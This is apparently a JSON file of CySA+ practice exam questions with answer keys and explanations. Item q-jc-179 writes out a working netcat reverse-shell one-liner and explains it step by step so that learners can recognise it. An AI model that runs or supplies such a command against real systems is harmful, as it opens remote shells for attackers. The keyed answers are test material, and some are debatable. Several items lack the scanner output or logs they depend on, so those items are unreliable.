    "explanation": "The suspicious entry on the host-based IDS logs indicates that a reverse shell was executed on the\nhost, which connects to the remote IP address 10.1.2.3 on port 8080. The shell script option D uses\nthe netstat command to check if there is any active connection to that IP address and port, and prints\n“Malicious activity” if there is, or “OK” otherwise. This is the most accurate way to confirm if the\nreverse shell is still active, as the other options may not detect the connection or may produce false\npositives.\nReference\nCompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 8: Incident Response, page 339.\nReverse Shell Cheat Sheet, Bash section.",
    "image": "images/page_138_img_2.jpeg"
  },
  {
    "id": "q-jc-172",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following best describes the threat concept in which an organization works to ensure\nthat all network users only open attachments from known sources?",
    "options": [
      "A. Hacktivist threat",
      "B. Advanced persistent threat",
      "C. Unintentional insider threat",
      "D. Nation-state threat"
    ],
    "answer": "C",
    "explanation": "An unintentional insider threat is a type of network security threat that occurs when a legitimate\nuser of the network unknowingly exposes the network to malicious activity, such as opening a\nphishing email or a malware-infected attachment from an unknown source. This can compromise the\nnetwork security and allow attackers to access sensitive data or systems. The other options are not\nrelated to the threat concept of ensuring that all network users only open attachments from known\nsources.\nReference\nCompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 1: Threat and Vulnerability\nManagement, page 13.\nWhat is Network Security | Threats, Best Practices | Imperva, Network Security Threats and Attacks,\nPhishing section.\nFive Ways to Defend Against Network Security Threats, 2. Use Firewalls section.",
    "image": "images/page_138_img_2.jpeg"
  },
  {
    "id": "q-jc-173",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company has the following security requirements:\n. No public IPs\n· All data secured at rest\n. No insecure ports/protocols\nAfter a cloud scan is completed, a security analyst receives reports that several misconfigurations are\nputting the company at risk. Given the following cloud scanner output:\nWhich of the following should the analyst recommend be updated first to meet the security\nrequirements and reduce risks?",
    "options": [
      "A. VM_PRD_DB",
      "B. VM_DEV_DB",
      "C. VM_DEV_Web02",
      "D. VM_PRD_Web01"
    ],
    "answer": "D",
    "explanation": "This VM has a public IP and an open port 80, which violates the company’s security requirements of\nno public IPs and no insecure ports/protocols. It also exposes the VM to potential attacks from the\ninternet. This VM should be updated first to use a private IP and close the port 80, or use a secure\nprotocol such as HTTPS.\nReference\n[CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition], Chapter 2: Cloud and Hybrid\nEnvironments, page 67.\n[What is a Public IP Address?]\n[What is Port 80?]",
    "image": "images/page_138_img_2.jpeg"
  },
  {
    "id": "q-jc-174",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A vulnerability analyst received a list of system vulnerabilities and needs to evaluate the relevant\nimpact of the exploits on the business. Given the constraints of the current sprint, only three can be\nremediated. Which of the following represents the least impactful risk, given the CVSS3.1 base\nscores?",
    "options": [
      "A. AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:L - Base Score 6.0",
      "B. AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:L/A:L - Base Score 7.2",
      "C. AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H - Base Score 6.4",
      "D. AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L - Base Score 6.5"
    ],
    "answer": "A",
    "explanation": "This option represents the least impactful risk because it has the lowest base score among the four\noptions, and it also requires high privileges, user interaction, and high attack complexity to exploit,\nwhich reduces the likelihood of a successful attack.\nReference: The base scores were calculated using the Common Vulnerability Scoring System Version\n3.1 Calculator from FIRST. The explanation was based on the CVSS standards guide from NVD and\nthe CVSS 3.1 Calculator Online from Calculators Hub.",
    "image": null
  },
  {
    "id": "q-jc-175",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following should be updated after a lessons-learned review?",
    "options": [
      "A. Disaster recovery plan",
      "B. Business continuity plan",
      "C. Tabletop exercise",
      "D. Incident response plan"
    ],
    "answer": "D",
    "explanation": "A lessons-learned review is a process of evaluating the effectiveness and efficiency of the incident\nresponse plan after an incident or an exercise. The purpose of the review is to identify the strengths\nand weaknesses of the incident response plan, and to update it accordingly to improve the future\nperformance and resilience of the organization. Therefore, the incident response plan should be\nupdated after a lessons-learned review.\nReference: The answer was based on the NCSC CAF guidance from the National Cyber Security\nCentre, which states: “You should use post-incident and post-exercise reviews to actively reduce the\nrisks associated with the same, or similar, incidents happening in future. Lessons learned can inform\nany aspect of your cyber security, including: System configuration Security monitoring and reporting\nInvestigation procedures Containment/recovery strategies”",
    "image": null
  },
  {
    "id": "q-jc-176",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst receives threat intelligence regarding potential attacks from an actor with seemingly\nunlimited time and resources. Which of the following best describes the threat actor attributed to\nthe malicious activity?",
    "options": [
      "A. Insider threat",
      "B. Ransomware group",
      "C. Nation-state",
      "D. Organized crime"
    ],
    "answer": "C",
    "explanation": "Nation-state actors (C) are characterized by virtually unlimited time, funding, and technical resources backed by a government. They conduct Advanced Persistent Threat (APT) campaigns over months or years using zero-day exploits, custom malware, and sophisticated tradecraft. Insider threats (A) have physical access but limited resources. Ransomware groups (B) are financially motivated criminal organizations with limited state-level resources. Organized crime (D) is profit-driven and lacks the strategic patience of nation-state actors. The key distinguisher is 'unlimited time AND resources.'",
    "image": null
  },
  {
    "id": "q-jc-177",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A disgruntled open-source developer has decided to sabotage a code repository with a logic bomb\nthat will act as a wiper. Which of the following parts of the Cyber Kill Chain does this act exhibit?",
    "options": [
      "A. Reconnaissance",
      "B. Weaponization",
      "C. Exploitation",
      "D. Installation"
    ],
    "answer": "B",
    "explanation": "Weaponization is the stage of the Cyber Kill Chain where the attacker creates or modifies a malicious\npayload to use against a target. In this case, the disgruntled open-source developer has created a\nlogic bomb that will act as a wiper, which is a type of malware that destroys data on a system. This is\nan example of weaponization, as the developer has prepared a cyberweapon to sabotage the code\nrepository.\nReference: The answer was based on the web search results from Bing, especially the following\nsources:\nCyber Kill Chain® | Lockheed Martin, which states: “In the weaponization step, the adversary creates\nremote access malware weapon, such as a virus or worm, tailored to one or more vulnerabilities.”\nThe Cyber Kill Chain: The Seven Steps of a Cyberattack - EC-Council, which states: “In the\nweaponization stage, all of the attacker’s preparatory work culminates in the creation of malware to\nbe used against an identified target.”\nWhat is the Cyber Kill Chain? Introduction Guide - CrowdStrike, which states: “Weaponization: The\nattacker creates a malicious payload that will be delivered to the target.”",
    "image": null
  },
  {
    "id": "q-jc-178",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Following an incident, a security analyst needs to create a script for downloading the configuration of\nall assets from the cloud tenancy. Which of the following authentication methods should the analyst\nuse?",
    "options": [
      "A. MFA",
      "B. User and password",
      "C. PAM",
      "D. Key pair"
    ],
    "answer": "D",
    "explanation": "Key pair authentication is a method of using a public and private key to securely access cloud\nresources, such as downloading the configuration of assets from a cloud tenancy. Key pair\nauthentication is more secure than user and password or PAM, and does not require an additional\nfactor like MFA.\nReference: Authentication Methods - Configuring Tenant-Wide Settings in Azure …, Cloud Foundation\n- Oracle Help Center",
    "image": null
  },
  {
    "id": "q-jc-179",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst detected the following suspicious activity:\nrm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 > tmp/f\nWhich of the following most likely describes the activity?",
    "options": [
      "A. Network pivoting",
      "B. Host scanning",
      "C. Privilege escalation",
      "D. Reverse shell"
    ],
    "answer": "D",
    "explanation": "The command rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 > tmp/f is a\none-liner that creates a reverse shell from the target machine to the attacker’s machine. It does the\nfollowing steps:\n•\nrm -f /tmp/f deletes any existing file named /tmp/f\n•\nmknod /tmp/f p creates a named pipe (FIFO) file named /tmp/f\n•\ncat /tmp/f|/bin/sh -i 2>&1 reads from the pipe and executes the commands using /bin/sh in\ninteractive mode, redirecting the standard error to the standard output\n•\nnc 10.0.0.1 1234 > tmp/f connects to the attacker’s machine at IP address 10.0.0.1 and port\n1234 using netcat, and writes the output to the pipe\nThis way, the attacker can send commands to the target machine and receive the output through the\nnetcat connection, effectively creating a reverse shell.\nReference\nHack the Galaxy\nReverse Shell Cheat Sheet",
    "image": null
  },
  {
    "id": "q-jc-180",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following can be used to learn more about TTPs used by cybercriminals?",
    "options": [
      "A. ZenMAP",
      "B. MITRE ATT&CK",
      "C. National Institute of Standards and Technology",
      "D. theHarvester"
    ],
    "answer": "B",
    "explanation": "MITRE ATT&CK is a globally accessible knowledge base of adversary tactics and techniques based on\nreal-world observations. It is used as a foundation for the development of specific threat models and\nmethodologies in the private sector, in government, and in the cybersecurity product and service\ncommunity. It can help security professionals understand, detect, and mitigate cyber threats by\nproviding a comprehensive framework of TTPs.\nReference: MITRE ATT&CK, Getting Started with ATT&CK, MITRE ATT&CK | MITRE",
    "image": null
  },
  {
    "id": "q-jc-181",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "After updating the email client to the latest patch, only about 15% of the workforce is able to use\nemail. Windows 10 users do not experience issues, but Windows 11 users have constant issues.\nWhich of the\nfollowing did the change management team fail to do?",
    "options": [
      "A. Implementation",
      "B. Testing",
      "C. Rollback",
      "D. Validation"
    ],
    "answer": "B",
    "explanation": "Testing is a crucial step in any change management process, as it ensures that the change is\ncompatible with the existing systems and does not cause any errors or disruptions. In this case, the\nchange management team failed to test the email client patch on Windows 11 devices, which\nresulted in a widespread issue for the users. Testing would have revealed the problem before the\npatch was deployed, and allowed the team to fix it or postpone the change.\nReference: 7 Reasons Why Change Management Strategies Fail and How to Avoid Them, CompTIA\nCySA+ CS0-003 Certification Study Guide",
    "image": null
  },
  {
    "id": "q-jc-182",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "The management team requests monthly KPI reports on the company's cybersecurity program.\nWhich of the following KPIs would identify how long a security threat goes unnoticed in the\nenvironment?",
    "options": [
      "A. Employee turnover",
      "B. Intrusion attempts",
      "C. Mean time to detect",
      "D. Level of preparedness"
    ],
    "answer": "C",
    "explanation": "Mean time to detect (MTTD) is a metric that measures the average time it takes for an organization\nto discover or detect an incident. It is a key performance indicator in incident management and a\nmeasure of incident response capabilities. A low MTTD indicates that the organization can quickly\nidentify security threats and minimize their impact12.\nReference: What Is MTTD (Mean Time to Detect)? A Detailed Explanation, Introduction to MTTD:\nMean Time to Detect",
    "image": null
  },
  {
    "id": "q-jc-183",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An incident response analyst is investigating the root cause of a recent malware outbreak. Initial\nbinary analysis indicates that this malware disables host security services and performs cleanup\nroutines on it infected hosts, including deletion of initial dropper and removal of event log entries\nand prefetch files from the host. Which of the following data sources would most likely reveal\nevidence of the root cause?\n(Select two).",
    "options": [
      "A. Creation time of dropper",
      "B. Registry artifacts",
      "C. EDR data",
      "D. Prefetch files",
      "E. File system metadata",
      "F. Sysmon event log"
    ],
    "answer": [
      "B",
      "C"
    ],
    "explanation": "B. Registry artifacts and C. EDR data are the most valuable sources for investigating malware that disables security tools. Registry artifacts reveal persistence mechanisms (Run keys, Services), auto-start entries, and disabled security software settings — all commonly modified by malware. EDR (Endpoint Detection and Response) data provides real-time telemetry on process execution, file operations, and network connections even when AV is disabled. Prefetch files (D) show execution history but not disabling actions. Sysmon logs (F) are valuable but may have been wiped by the malware. File system metadata and creation time provide limited context about disabling behavior.",
    "image": null
  },
  {
    "id": "q-jc-184",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "During an incident, some loCs of possible ransomware contamination were found in a group of\nservers in a segment of the network. Which of the following steps should be taken next?",
    "options": [
      "A. Isolation",
      "B. Remediation",
      "C. Reimaging",
      "D. Preservation"
    ],
    "answer": "A",
    "explanation": "Isolation is the first step to take after detecting some indicators of compromise (IoCs) of possible\nransomware contamination. Isolation prevents the ransomware from spreading to other servers or\nsegments of the network, and allows the security team to investigate and contain the incident.\nIsolation can be done by disconnecting the infected servers from the network, blocking the malicious\ntraffic, or applying firewall rules12.\nReference: 10 Things You Should Do After a Ransomware Attack, How to Recover from a Ransomware\nAttack: A Step-by-Step Guide",
    "image": null
  },
  {
    "id": "q-jc-185",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "When investigating a potentially compromised host, an analyst observes that the process BGInfo.exe\n(PID 1024), a Sysinternals tool used to create desktop backgrounds containing host details, has bee\nrunning for over two days. Which of the following activities will provide the best insight into this\npotentially malicious process, based on the anomalous behavior?",
    "options": [
      "A. Changes to system environment variables",
      "B. SMB network traffic related to the system process",
      "C. Recent browser history of the primary user",
      "D. Activities taken by PID 1024"
    ],
    "answer": "D",
    "explanation": "The activities taken by the process with PID 1024 will provide the best insight into this potentially\nmalicious process, based on the anomalous behavior. BGInfo.exe is a legitimate tool that displays\nsystem information on the desktop background, but it can also be used by attackers to gather\ninformation about the compromised host or to disguise malicious processes12. By monitoring the\nactivities of PID 1024, such as the files it accesses, the network connections it makes, or the\ncommands it executes, the analyst can determine if the process is benign or malicious.\nReference: bginfo.exe Windows process - What is it?, What is bginfo.exe? Is it Safe or a Virus? How to\nremove or fix it",
    "image": null
  },
  {
    "id": "q-jc-186",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A vulnerability scan of a web server that is exposed to the internet was recently completed. A\nsecurity analyst is reviewing the resulting vector strings:\nVulnerability 1: CVSS: 3.0/AV:N/AC: L/PR: N/UI : N/S: U/C: H/I : L/A:L\nVulnerability 2: CVSS: 3.0/AV: L/AC: H/PR:N/UI : N/S: U/C: L/I : L/A: H\nVulnerability 3: CVSS: 3.0/AV:A/AC: H/PR: L/UI : R/S: U/C: L/I : H/A:L\nVulnerability 4: CVSS: 3.0/AV: P/AC: L/PR: H/UI : N/S: U/C: H/I:N/A:L\nWhich of the following vulnerabilities should be patched first?",
    "options": [
      "A. Vulnerability 1",
      "B. Vulnerability 2",
      "C. Vulnerability 3",
      "D. Vulnerability 4"
    ],
    "answer": "A",
    "explanation": "Vulnerability 1 has the highest CVSS 3.0 Base Score and must be patched first. Analysis: AV:N (Network) means remotely exploitable; AC:L (Low complexity) requires no special conditions; PR:N (No privileges required) means unauthenticated; UI:N (No user interaction) needed; C:H (High confidentiality impact). This combination yields approximately 8.6-9.0 (Critical/High). Vulnerability 2 has AV:L (Local) reducing exploitability. Vulnerability 3 has AV:A (Adjacent network) and AC:H (High complexity) — lower risk. Vulnerability 4 has AV:P (Physical access) — requires physical proximity, lowest risk. Always prioritize by Attack Vector first (N > A > L > P), then complexity and privileges.",
    "image": null
  },
  {
    "id": "q-jc-187",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "A Chief Information Security Officer (CISO) wants to disable a functionality on a business-critical web\napplication that is vulnerable to RCE in order to maintain the minimum risk level with minimal\nincreased cost.\nWhich of the following risk treatments best describes what the CISO is looking for?",
    "options": [
      "A. Transfer",
      "B. Mitigate",
      "C. Accept",
      "D. Avoid"
    ],
    "answer": "B",
    "explanation": "Risk Mitigation (B) involves implementing security controls or configuration changes to reduce the likelihood and impact of a vulnerability. In this case, disabling a specific vulnerable feature/functionality within an existing system rather than retired the entire web application itself acts as a mitigation strategy to lower the risk of Remote Code Execution (RCE) with minimal cost.",
    "image": "images/page_147_img_2.jpeg"
  },
  {
    "id": "q-jc-189",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is a nation-state actor least likely to be concerned with?",
    "options": [
      "A. Detection by MITRE ATT&CK framework.",
      "B. Detection or prevention of reconnaissance activities.",
      "C. Examination of its actions and objectives.",
      "D. Forensic analysis for legal action of the actions taken"
    ],
    "answer": "D",
    "explanation": "A nation-state actor is a group or individual that conducts cyberattacks on behalf of a government or\na political entity. They are usually motivated by national interests, such as espionage, sabotage, or\ninfluence operations. They are often highly skilled, resourced, and persistent, and they operate with\nthe protection or support of their state sponsors. Therefore, they are less likely to be concerned with\nthe forensic analysis for legal action of their actions, as they are unlikely to face prosecution or\nextradition in their own country or by international law. They are more likely to be concerned with\nthe detection by the MITRE ATT&CK framework, which is a knowledge base of adversary tactics and\ntechniques based on real-world observations. The MITRE ATT&CK framework can help defenders\nidentify, prevent, and respond to cyberattacks by nation-state actors. They are also likely to be\nconcerned with the detection or prevention of reconnaissance activities, which are the preliminary\nsteps of cyberattacks that involve gathering information about the target, such as vulnerabilities,\nnetwork topology, or user credentials. Reconnaissance activities can expose the presence, intent,\nand capabilities of the attackers, and allow defenders to take countermeasures. Finally, they are\nlikely to be concerned with the examination of their actions and objectives, which can reveal their\nmotives, strategies, and goals, and help defenders understand their threat profile and attribution.\nReference:\n1: MITRE ATT&CK®\n2: What is the MITRE ATT&CK Framework? | IBM\n3: MITRE ATT&CK | MITRE\n4: Cyber Forensics Explained: Reasons, Phases & Challenges of Cyber Forensics | Splunk\n5: Digital Forensics: How to Identify the Cause of a Cyber Attack - G2",
    "image": null
  },
  {
    "id": "q-jc-190",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following most accurately describes the Cyber Kill Chain methodology?",
    "options": [
      "A. It is used to correlate events to ascertain the TTPs of an attacker.",
      "B. It is used to ascertain lateral movements of an attacker, enabling the process to be stopped.",
      "C. It provides a clear model of how an attacker generally operates during an intrusion and the actions\nto take at each stage",
      "D. It outlines a clear path for determining the relationships between the attacker, the technology\nused, and the target"
    ],
    "answer": "C",
    "explanation": "The Cyber Kill Chain methodology provides a clear model of how an attacker generally operates\nduring an intrusion and the actions to take at each stage. It is divided into seven stages:\nreconnaissance, weaponization, delivery, exploitation, installation, command and control, and\nactions on objectives. It helps network defenders understand and prevent cyberattacks by identifying\nthe attacker’s objectives and tactics. Reference: The Cyber Kill Chain: The Seven Steps of a\nCyberattack",
    "image": null
  },
  {
    "id": "q-jc-191",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst discovers unusual outbound connections to an IP that was previously blocked at the web\nproxy and firewall. Upon further investigation, it appears that the proxy and firewall rules that were\nin place were removed by a service account that is not recognized. Which of the following parts of\nthe Cyber Kill Chain does this describe?",
    "options": [
      "A. Delivery",
      "B. Command and control",
      "C. Reconnaissance",
      "D. Weaporization"
    ],
    "answer": "B",
    "explanation": "The Command and Control stage of the Cyber Kill Chain describes the communication between the\nattacker and the compromised system. The attacker may use this channel to send commands, receive\ndata, or update malware. If the analyst discovers unusual outbound connections to an IP that was\npreviously blocked, it may indicate that the attacker has established a command and control channel\nand bypassed the security controls. Reference: Cyber Kill Chain® | Lockheed Martin",
    "image": "images/page_154_img_2.jpeg"
  },
  {
    "id": "q-jc-192",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "A SOC manager is establishing a reporting process to manage vulnerabilities. Which of the following\nwould be the best solution to identify potential loss incurred by an issue?",
    "options": [
      "A. Trends",
      "B. Risk score",
      "C. Mitigation",
      "D. Prioritization"
    ],
    "answer": "B",
    "explanation": "A risk score is a numerical value that represents the potential impact and likelihood of a vulnerability\nbeing exploited. It can help to identify the potential loss incurred by an issue and prioritize\nremediation efforts accordingly. https://www.comptia.org/training/books/cysa-cs0-003-study-guide",
    "image": "images/page_154_img_2.jpeg"
  },
  {
    "id": "q-jc-193",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following is a benefit of the Diamond Model of Intrusion Analysis?",
    "options": [
      "A. It provides analytical pivoting and identifies knowledge gaps.",
      "B. It guarantees that the discovered vulnerability will not be exploited again in the future.",
      "C. It provides concise evidence that can be used in court",
      "D. It allows for proactive detection and analysis of attack events"
    ],
    "answer": "A",
    "explanation": "The Diamond Model of Intrusion Analysis is a framework that helps analysts to understand the\nrelationships between the adversary, the victim, the infrastructure, and the capability involved in an\nattack. It also enables analytical pivoting, which is the process of moving from one piece of\ninformation to another related one, and identifies knowledge gaps that need further investigation.",
    "image": "images/page_154_img_2.jpeg"
  },
  {
    "id": "q-jc-194",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A SIEM alert is triggered based on execution of a suspicious one-liner on two workstations in the\norganization's environment. An analyst views the details of these events below:\nWhich of the following statements best describes the intent of the attacker, based on this one-liner?",
    "options": [
      "A. Attacker is escalating privileges via JavaScript.",
      "B. Attacker is utilizing custom malware to download an additional script.",
      "C. Attacker is executing PowerShell script \"AccessToken.psr.",
      "D. Attacker is attempting to install persistence mechanisms on the target machine."
    ],
    "answer": "B",
    "explanation": "The one-liner script is utilizing JavaScript to execute a PowerShell command that downloads and runs\na script from an external source, indicating the use of custom malware to download an additional\nscript. Reference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 4: Security\nOperations and Monitoring, page 156.",
    "image": "images/page_154_img_2.jpeg"
  },
  {
    "id": "q-jc-195",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A security analyst detects an email server that had been compromised in the internal network. Users\nhave been reporting strange messages in their email inboxes and unusual network traffic. Which of\nthe following incident response steps should be performed next?",
    "options": [
      "A. Preparation",
      "B. Validation",
      "C. Containment",
      "D. Eradication"
    ],
    "answer": "C",
    "explanation": "After detecting a compromised email server and unusual network traffic, the next step in incident\nresponse is containment, to prevent further damage or spread of the\ncompromise. Reference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 5:\nIncident Response, page 197.",
    "image": "images/page_154_img_2.jpeg"
  },
  {
    "id": "q-jc-196",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "While reviewing web server logs, a security analyst discovers the following suspicious line:\nWhich of the following is being attempted?",
    "options": [
      "A. Remote file inclusion",
      "B. Command injection",
      "C. Server-side request forgery",
      "D. Reverse shell"
    ],
    "answer": "B",
    "explanation": "The suspicious line in the web server logs is an attempt to execute a command on the server,\nindicating a command injection attack.\nReference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 5, page 197; CompTIA\nCySA+ CS0-003 Certification Study Guide, Chapter 5, page 205.",
    "image": "images/page_156_img_2.jpeg"
  },
  {
    "id": "q-jc-197",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A payroll department employee was the target of a phishing attack in which an attacker\nimpersonated a department director and requested that direct deposit information be updated to a\nnew account. Afterward, a deposit was made into the unauthorized account. Which of the following\nis one of the first actions the incident response team should take when they receive notification of\nthe attack?",
    "options": [
      "A. Scan the employee's computer with virus and malware tools.",
      "B. Review the actions taken by the employee and the email related to the event",
      "C. Contact human resources and recommend the termination of the employee.",
      "D. Assign security awareness training to the employee involved in the incident."
    ],
    "answer": "B",
    "explanation": "In case of a phishing attack, it’s crucial to review what actions were taken by the employee and\nanalyze the phishing email to understand its nature and impact.\nReference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 6, page 246; CompTIA\nCySA+ CS0-003 Certification Study Guide, Chapter 6, page 255.",
    "image": "images/page_156_img_2.jpeg"
  },
  {
    "id": "q-jc-198",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is the most important reason for an incident response team to develop a\nformal incident declaration?",
    "options": [
      "A. To require that an incident be reported through the proper channels",
      "B. To identify and document staff who have the authority to declare an incident",
      "C. To allow for public disclosure of a security event impacting the organization",
      "D. To establish the department that is responsible for responding to an incident"
    ],
    "answer": "B",
    "explanation": "The formal incident declaration is crucial to identify and document the staff who have the authority\nto declare an incident, ensuring that incidents are handled by authorized\npersonnel. Reference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 5: Incident\nResponse, page 197.",
    "image": "images/page_156_img_2.jpeg"
  },
  {
    "id": "q-jc-199",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security manager is looking at a third-party vulnerability metric (SMITTEN) to improve upon the\ncompany's current method that relies on CVSSv3. Given the following:\nWhich of the following vulnerabilities should be prioritized?",
    "options": [
      "A. Vulnerability 1",
      "B. Vulnerability 2",
      "C. Vulnerability 3",
      "D. Vulnerability 4"
    ],
    "answer": "B",
    "explanation": "Vulnerability 2 should be prioritized as it is exploitable, has high exploit activity, and is exposed\nexternally according to the SMITTEN metric. Reference: Vulnerability Management Metrics: 5\nMetrics to Start Measuring in Your Program, Section: Vulnerability Severity.",
    "image": "images/page_156_img_2.jpeg"
  },
  {
    "id": "q-jc-200",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A small company does no! have enough staff to effectively segregate duties to prevent error and\nfraud in payroll management. The Chief Information Security Officer (CISO) decides to maintain and\nreview logs and audit trails to mitigate risk. Which of the following did the CISO implement?",
    "options": [
      "A. Corrective controls",
      "B. Compensating controls",
      "C. Operational controls",
      "D. Administrative controls"
    ],
    "answer": "B",
    "explanation": "Compensating controls are alternative controls that provide a similar level of protection as the\noriginal controls, but are used when the original controls are not feasible or cost-effective. In this\ncase, the CISO implemented compensating controls by reviewing logs and audit trails to mitigate the\nrisk of error and fraud in payroll management, since segregating duties was not possible due to the\nsmall staff size",
    "image": null
  },
  {
    "id": "q-jc-201",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Following a recent security incident, the Chief Information Security Officer is concerned with\nimproving visibility and reporting of malicious actors in the environment. The goal is to reduce the\ntime to prevent lateral movement and potential data exfiltration. Which of the following techniques\nwill best achieve the improvement?",
    "options": [
      "A. Mean time to detect",
      "B. Mean time to respond",
      "C. Mean time to remediate",
      "D. Service-level agreement uptime"
    ],
    "answer": "A",
    "explanation": "Mean time to detect (MTTD) is a metric that measures how quickly an organization can identify a\nsecurity incident or a malicious actor in the environment. Reducing MTTD can improve visibility and\nreporting of threats, as well as prevent lateral movement and data exfiltration by detecting them\nsooner.",
    "image": null
  },
  {
    "id": "q-jc-202",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Due to an incident involving company devices, an incident responder needs to take a mobile phone\nto the lab for further investigation. Which of the following tools should be used to maintain the\nintegrity of the mobile phone while it is transported? (Select two).",
    "options": [
      "A. Signal-shielded bag",
      "B. Tamper-evident seal",
      "C. Thumb drive",
      "D. Crime scene tape",
      "E. Write blocker",
      "F. Drive duplicator"
    ],
    "answer": [
      "A",
      "B"
    ],
    "explanation": "A. Signal-shielded bag (Faraday bag) and B. Tamper-evident seal are the correct tools for transporting a mobile phone to a forensic lab. A signal-shielded (Faraday) bag blocks all wireless signals (cellular, Wi-Fi, Bluetooth) preventing remote wipe commands from reaching the device and preserving its current state. A tamper-evident seal ensures chain of custody integrity by showing if the device was accessed during transport. A thumb drive (C) cannot protect the device. Crime scene tape (D) is not appropriate for device transport. A write blocker (E) is for disk imaging. A drive duplicator (F) is for copying storage media, not protecting a live mobile device in transit.",
    "image": null
  },
  {
    "id": "q-jc-203",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst is working on a server patch management policy that will allow the infrastructure\nteam to be informed more quickly about new patches. Which of the following would most likely be\nrequired by the infrastructure team so that vulnerabilities can be remediated quickly? (Select two).",
    "options": [
      "A. Hostname",
      "B. Missing KPI",
      "C. CVE details",
      "D. POC availability",
      "E. loCs",
      "F. npm identifier"
    ],
    "answer": [
      "C",
      "E"
    ],
    "explanation": "C. CVE details and E. IoCs (Indicators of Compromise) are the most critical fields in a patch management policy for informing the infrastructure team about new patches. CVE details provide the specific vulnerability identifier, severity score (CVSS), and affected software versions that the team needs to identify affected systems. IoCs include file hashes, IP addresses, and behavioral patterns that help the team detect exploitation attempts. Hostname (A) is too specific. Missing KPI (B) is a performance metric, not patch information. POC availability (D) indicates exploitability urgency but is secondary. npm identifier (F) is package-specific and not universally applicable.",
    "image": null
  },
  {
    "id": "q-jc-204",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst is suddenly unable to enrich data from the firewall. However, the other open intelligence\nfeeds continue to work. Which of the following is the most likely reason the firewall feed stopped\nworking?",
    "options": [
      "A. The firewall service account was locked out.",
      "B. The firewall was using a paid feed.",
